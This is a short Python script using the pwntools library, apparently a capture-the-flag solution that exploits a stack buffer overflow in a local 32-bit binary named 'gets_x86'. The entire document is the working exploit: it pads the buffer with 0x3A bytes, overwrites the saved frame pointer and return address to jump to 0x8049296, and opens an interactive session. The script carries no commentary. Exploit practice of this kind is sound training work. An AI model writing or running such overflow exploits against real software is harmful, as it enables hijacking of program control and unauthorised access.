#coding=utf-8
from pwn import *

io = process("./gets_x86")
ELF("./gets_x86")
payload = 'A' * 0x3A + 'bi0x' + p32(0x8049296)
io.sendline(payload)
io.interactive()